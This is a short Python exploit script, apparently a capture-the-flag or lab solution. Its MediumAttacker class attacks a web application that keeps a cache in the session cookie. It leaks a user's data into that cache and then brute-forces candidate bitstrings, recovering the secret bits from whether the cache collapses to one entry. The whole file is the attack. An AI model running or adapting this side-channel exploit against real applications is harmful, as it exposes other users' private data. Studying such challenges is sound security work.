from attack_util import *
from itertools import product

class MediumAttacker(Attacker):
    CACHE_NAME = 'cache_for_part_to_dict'
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.empty_cookie = self.session_cookie
    
    def flush_cache(self):
        self.session_cookie = self.empty_cookie
    
    @property
    def session_cache(self):
        return self.get_cookie_data(self.CACHE_NAME)
    
    def find_part(self, part):
        self.flush_cache()
        self.leak_user_part_to_cache(part)
        cache_with_part_cookie = self.session_cookie
        for cand_bits in product('01', repeat=PART_TO_BITLEN[part]):
            cand_bitstring = ''.join(cand_bits)
            self.session_cookie = cache_with_part_cookie
            self.load_part_bits_to_cache(part, cand_bitstring)
            if len(self.session_cache) == 1:
                return cand_bitstring
    
if __name__ == '__main__':
    print(MediumAttacker.attack())